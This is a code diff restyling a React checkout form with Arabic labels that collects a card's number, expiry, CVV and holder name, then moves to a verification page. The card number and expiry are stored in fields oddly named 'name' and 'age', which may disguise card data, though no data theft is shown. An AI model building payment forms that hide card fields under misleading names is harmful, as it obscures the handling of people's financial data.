@@ -90,33 +90,32 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     try { await onSubmit(fields); router.push("/checkout/verify"); } finally { setLoading(false); }
   };
 
-  const inputBase = "w-full border rounded-xl px-3 py-2.5 text-sm text-gray-900 focus:outline-none transition bg-white";
-  const inputOk = "border-gray-200 focus:border-teal-400 focus:ring-2 focus:ring-teal-100";
-  const inputErr = "border-red-300 bg-red-50/30 focus:border-red-400 focus:ring-2 focus:ring-red-100";
+  const inputBase = "w-full rounded-xl px-4 py-3 text-sm focus:outline-none transition";
+  const getStyle = (hasError: boolean) => ({
+    backgroundColor: "#faf7f2",
+    border: hasError ? "1.5px solid #ef4444" : "1.5px solid rgba(188,146,85,0.2)",
+    color: "#0A1825",
+  });
 
   const displayNumber = fields.name ? fields.name.padEnd(19, " ").slice(0, 19) : "0000 0000 0000 0000";
 
   const cardBg = cardBrand === "mada"
     ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
     : cardBrand === "mastercard"
-    ? "linear-gradient(135deg, #eb5757 0%, #000000 100%)"
-    : "linear-gradient(135deg, #0d9488 0%, #065f46 50%, #064e3b 100%)";
+    ? "linear-gradient(135deg, #1a1a2e 0%, #2d132c 100%)"
+    : "linear-gradient(135deg, #0A1825 0%, #132d44 100%)";
 
   return (
     <>
       {/* ── Visual Card ── */}
-      <div className="w-full max-w-sm mx-auto mb-5" style={{ perspective: "1000px", minHeight: "185px" }}>
+      <div className="w-full max-w-sm mx-auto mb-6" style={{ perspective: "1000px", minHeight: "185px" }}>
         <div style={{ transition: "transform 0.6s", transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", position: "relative", minHeight: "185px" }}>
           {/* Front */}
-          <div className="absolute inset-0 rounded-2xl p-5 text-white select-none" style={{ background: cardBg, boxShadow: "0 16px 48px rgba(0,0,0,0.25)", backfaceVisibility: "hidden" }}>
+          <div className="absolute inset-0 rounded-2xl p-5 text-white select-none" style={{ background: cardBg, boxShadow: "0 12px 40px rgba(10,24,37,0.2)", backfaceVisibility: "hidden" }}>
             <div className="flex justify-between items-start mb-6">
-              <div className="w-10 h-7 rounded-md" style={{ background: "linear-gradient(135deg, #d4af37, #f5e06e, #d4af37)" }} />
+              <div className="w-10 h-7 rounded-md" style={{ background: "linear-gradient(135deg, #BC9255, #f5e06e, #BC9255)" }} />
               <div className="h-7 flex items-center">
-                {cardBrand ? (
-                  <CardLogo brand={cardBrand} width={48} className="brightness-0 invert" />
-                ) : (
-                  <span className="text-xs text-white/40">CARD</span>
-                )}
+                {cardBrand ? <CardLogo brand={cardBrand} width={48} className="brightness-0 invert" /> : <span className="text-xs text-white/40">CARD</span>}
               </div>
             </div>
             <div className="font-mono text-lg sm:text-xl tracking-widest mb-5 text-center" dir="ltr">{displayNumber}</div>
@@ -132,7 +131,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
             </div>
           </div>
           {/* Back */}
-          <div className="absolute inset-0 rounded-2xl text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 16px 48px rgba(0,0,0,0.25)", backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
+          <div className="absolute inset-0 rounded-2xl text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 12px 40px rgba(10,24,37,0.2)", backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
             <div className="w-full h-10 mt-6" style={{ background: "#1a1a1a" }} />
             <div className="px-5 mt-4">
               <p className="text-[10px] opacity-50 mb-1 text-right">CVV</p>
@@ -143,19 +142,19 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
       </div>
 
       {/* ── Form ── */}
-      <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
-        {/* Accepted cards bar */}
-        <div className="flex items-center gap-3 px-4 py-2.5 bg-gray-50 border-b border-gray-100">
-          <span className="text-[11px] sm:text-xs text-gray-500 font-medium">نقبل:</span>
-          <CardLogo brand="mada" width={40} />
-          <CardLogo brand="visa" width={40} />
-          <CardLogo brand="mastercard" width={40} />
+      <div className="rounded-2xl overflow-hidden" style={{ backgroundColor: "#fff", border: "1px solid rgba(188,146,85,0.12)" }}>
+        {/* Accepted cards */}
+        <div className="flex items-center gap-3 px-4 py-2.5" style={{ backgroundColor: "#faf7f2", borderBottom: "1px solid rgba(188,146,85,0.1)" }}>
+          <span className="text-[11px] font-medium" style={{ color: "#A77D4B" }}>نقبل:</span>
+          <CardLogo brand="mada" width={36} />
+          <CardLogo brand="visa" width={36} />
+          <CardLogo brand="mastercard" width={36} />
         </div>
 
         <div className="p-4 sm:p-5 space-y-4">
-          {/* Card Number - with logo inside */}
+          {/* Card Number */}
           <div>
-            <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
+            <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
               رقم البطاقة <span className="text-red-400">*</span>
             </label>
             <div className="relative">
@@ -173,26 +172,20 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                   setFields(f => ({ ...f, name: v }));
                   setCardError("");
                 }}
-                className={`${inputBase} ${cardError || (errors && !fields.name) ? inputErr : inputOk} pl-14 sm:pl-16 text-right`}
+                className={`${inputBase} pl-14 text-right`}
+                style={getStyle(!!(cardError || (errors && !fields.name)))}
               />
-              {/* Logo inside input */}
-              <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center pointer-events-none">
-                {cardBrand ? (
-                  <CardLogo brand={cardBrand} width={36} />
-                ) : (
-                  <div className="w-9 h-5.5 rounded bg-gray-100 flex items-center justify-center">
-                    <span className="text-[9px] text-gray-400">CARD</span>
-                  </div>
-                )}
+              <div className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none">
+                {cardBrand ? <CardLogo brand={cardBrand} width={34} /> : <span className="text-[9px]" style={{ color: "#A77D4B" }}>CARD</span>}
               </div>
             </div>
             {cardError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {cardError}</p>}
           </div>
 
-          {/* Expiry + CVV row */}
+          {/* Expiry + CVV */}
           <div className="grid grid-cols-2 gap-3">
             <div>
-              <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
+              <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
                 تاريخ الانتهاء <span className="text-red-400">*</span>
               </label>
               <input
@@ -208,12 +201,13 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                   setFields(f => ({ ...f, age: v }));
                   setExpiryError("");
                 }}
-                className={`${inputBase} ${expiryError || (errors && !fields.age) ? inputErr : inputOk} text-center`}
+                className={`${inputBase} text-center`}
+                style={getStyle(!!(expiryError || (errors && !fields.age)))}
               />
               {expiryError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {expiryError}</p>}
             </div>
             <div>
-              <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
+              <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
                 CVV <span className="text-red-400">*</span>
               </label>
               <input
@@ -230,7 +224,8 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                   setFields(f => ({ ...f, cvv: v }));
                   setCvvError("");
                 }}
-                className={`${inputBase} ${cvvError || (errors && !fields.cvv) ? inputErr : inputOk} text-center`}
+                className={`${inputBase} text-center`}
+                style={getStyle(!!(cvvError || (errors && !fields.cvv)))}
               />
               {cvvError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {cvvError}</p>}
             </div>
@@ -238,7 +233,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
 
           {/* Card Holder */}
           <div>
-            <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
+            <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
               اسم حامل البطاقة <span className="text-red-400">*</span>
             </label>
             <input
@@ -250,7 +245,8 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                 const v = e.target.value.replace(/[^a-zA-Z ]/g, "");
                 setFields(f => ({ ...f, cardHolder: v.toUpperCase() }));
               }}
-              className={`${inputBase} ${errors && !fields.cardHolder ? inputErr : inputOk}`}
+              className={inputBase}
+              style={getStyle(!!(errors && !fields.cardHolder))}
               dir="ltr"
             />
           </div>
@@ -258,17 +254,19 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
       </div>
 
       {/* ── Actions ── */}
-      <div className="flex gap-3 mt-4">
+      <div className="flex gap-3 mt-5">
         <button
           onClick={() => router.push("/cart")}
-          className="flex-1 border border-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl text-sm hover:bg-gray-50 transition"
+          className="flex-1 py-3.5 rounded-xl text-sm font-bold transition hover:opacity-80"
+          style={{ backgroundColor: "rgba(188,146,85,0.08)", color: "#A77D4B", border: "1px solid rgba(188,146,85,0.2)" }}
         >
           السابق
         </button>
         <button
           onClick={handleNext}
           disabled={loading}
-          className="flex-1 bg-gradient-to-r from-teal-600 to-emerald-600 hover:from-teal-700 hover:to-emerald-700 active:scale-[0.98] text-white font-bold py-3.5 rounded-2xl transition-all text-sm disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-teal-200/50"
+          className="flex-1 py-3.5 rounded-xl font-bold text-sm transition hover:opacity-90 active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed shadow-lg"
+          style={{ backgroundColor: "#BC9255", color: "#fff" }}
         >
           {loading ? "جاري المعالجة..." : "تأكيد الدفع"}
         </button>
